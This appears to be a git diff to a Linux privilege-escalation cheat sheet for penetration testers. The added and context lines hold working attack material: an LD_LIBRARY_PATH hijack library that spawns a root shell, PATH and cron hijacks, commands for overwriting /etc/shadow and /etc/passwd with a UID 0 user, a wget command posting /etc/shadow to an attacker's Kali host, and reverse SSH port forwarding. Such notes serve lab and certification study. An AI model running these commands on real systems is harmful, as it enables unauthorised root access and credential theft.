@@ -70,6 +70,13 @@ find / -name authorized_keys 2>/dev/null
 ### Sudo
 
 ```bash
+# Quick attempt at root shell
+sudo su
+# If su not found, others can be tried
+sudo -s
+sudo -i
+sudo /bin/bash
+sudo passwd
 # Identify what can be run using sudo
 sudo -l
 # Shell Escaping - ex: vim
@@ -79,7 +86,7 @@ sudo apache2 -f /etc/shadow  # can't edit, but can view system files
 sudo wget --post-file=/etc/shadow <kali-ip>:<port>  # Using netcat to collect
 ```
 
-#### LDD\_PRELOAD
+#### LD\_PRELOAD
 
 After running `sudo -l` if `env_keep+=LD_PRELOAD` a malicious script can be created and run
 
@@ -101,6 +108,34 @@ void _init() {
 ```bash
 gcc -fPIC -shared -o shell.so shell.c -nostartfiles
 sudo LD_PRELOAD=/path/to/shell.so apache2
+```
+
+#### LD\_LIBRARY\_PATH
+
+After running `sudo -l` if `env_keep+=LD_LIBRARY_PATH` a malicious script can be created and run
+
+{% code title="library_path.c" %}
+```bash
+#include <stdio.h>
+#include <stdlib.h>
+
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+    unsetenv("LD_LIBRARY_PATH");
+    setresuid(0,0,0);
+    system("/bin/bash -p");
+}
+```
+{% endcode %}
+
+```bash
+ldd /usr/bin/apache2
+# From the output choose a shared object to replace i.e. libcrypt.so.1
+# Compile the malicious script above to the name of the shared object to replace
+gcc -o libcrypt.so.1 -shared -fPIC library_path.c
+# Execute
+sudo LD_LIBRARY_PATH=. apache2
 ```
 
 #### CVE-2019-14287
@@ -127,10 +162,12 @@ sudo -V
 # Multiple exploits can be found online
 ```
 
-### SUID
+### SUID / SGID
 
 ```bash
 find / -type f perm -u=s 2>/dev/null
+# Search for both SUID and SGID files
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null
 ```
 
 #### Shared Object Injection
@@ -184,6 +221,7 @@ invoke-rc.d nginx rotate >/dev/null 2>&
 env  # Show environment variables
 find / type -f -perm -04000 -ls 2>/dev/null
 # Search on binaries from this output using strings
+
 # Example 1
 strings /usr/local/bin/suid-env
 # Look for commands that do not use absolute path i.e. service apache2 start
@@ -191,6 +229,8 @@ strings /usr/local/bin/suid-env
 echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0;}' >/tmp/service.c
 gcc /tmp/service.c -o /tmp/service  # Compile malicious service script
 export PATH=/tmp:$PATH  # Put /tmp at the beginning of the PATH
+/usr/local/bin/suid-env
+
 # Example 2
 strings /usr/local/bin/suid-env2
 # Command now does seem to use absolute path i.e. /usr/sbin/service apache2 start
@@ -211,11 +251,40 @@ getcap -r / 2>/dev/null
 
 ### Weak File Permissions
 
-```bash
-ls -la /etc/passwd  # Check for write access
-ls -la /etc/shadow  # Check for read access
-# If both can be read, the unsahdow utility can be used to combine them for cracking
+#### /etc/shadow
 
+```bash
+# Verify permissions
+ls -la /etc/shadow
+
+# If the file is readable, hash cracking can be attempted
+john/hashcat
+
+# If the file is writable, the root user's password hash can be replaced
+mkpasswd -m sha-512 newpassword  # Generate new password hash.
+# Backup shadow file and replace root user password hash with the new one
+```
+
+#### /etc/passwd
+
+```bash
+# Verify permissions
+ls -la /etc/passwd
+
+# If the file is writable, replace the second field with a hash overriding shadow
+openssl passwd "password"  # Generate new passowrd hash.
+
+# If the file can only be appeneded to, create new user with root user ID (0)
+newroot:<password-hash>:0:0:root:/root:/bin/bash
+```
+
+#### Backups
+
+```bash
+# There may be insecure backups of sensitive files
+# Common places are the / (root> directory, /tmp, and /var/backups
+# Verify root login
+grep PermitRootLogin /etc/ssh/sshd_config  # Look for 'PermitRootLogin yes'
 ```
 
 ### Passwords & Keys
@@ -224,7 +293,7 @@ ls -la /etc/shadow  # Check for read access
 
 ```bash
 # Check the user history to see if anything interesting was typed previously
-histoy
+history
 cat .bash_history
 # VPN findings
 cat myvpn.ovpn
@@ -267,7 +336,7 @@ PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 #### Cron Paths
 
 ```bash
-# Where is the PATH executing first?
+# Where is the PATH executing first? And can we write to it?
 # Is there a script being run without an absolute path?
 echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
 chmod +x /home/user/overwrite.sh
@@ -324,6 +393,27 @@ cd /tmp
 ### Service Exploits
 
 ```bash
+ps aux | grep "^root"
+<program> --version, -v
+dpkg -l | grep <program>  # Debian based OS
+rpm -qa | grep <program>  # Red Hat based OS
+# Search on output for exploits (Google/Searchsploit/GitHub)
+```
+
+#### Port Forwarding
+
+```bash
+# If a root process is bound to an internal port and exploit cannot run on target
+# From Target
+netstat -nl
+> tcp    0    127.0.0.1:3306  # Example of mysql listening locally
+ssh -R <Kali-port>:127.0.0.1:<service-port> <username>@<Kali-machine>
+ssh -R 4444:127.0.0.1:3306 kali@<Kali-machine>
+
+# From Kali
+netstat -ano | grep LIST  # Verify port forward is listening
+mysql -u root -h 127.0.0.1 -P 4444
+> select @@hostname
 ```
 
 ### Docker
@@ -347,6 +437,7 @@ docker run -v /:/mnt --rm -it bash chroot /mnt sh
 Should show up in LinEnum or linux-exploit-suggester
 
 ```bash
-uname -a
-# Search on output for exploits (Google/Searchsploit)
+uname -a  # Enumerate kernel version
+# Search on output for exploits (Google/Searchsploit/GitHub)
+searchploit linux kernel 2.6 debian priv esc
 ```
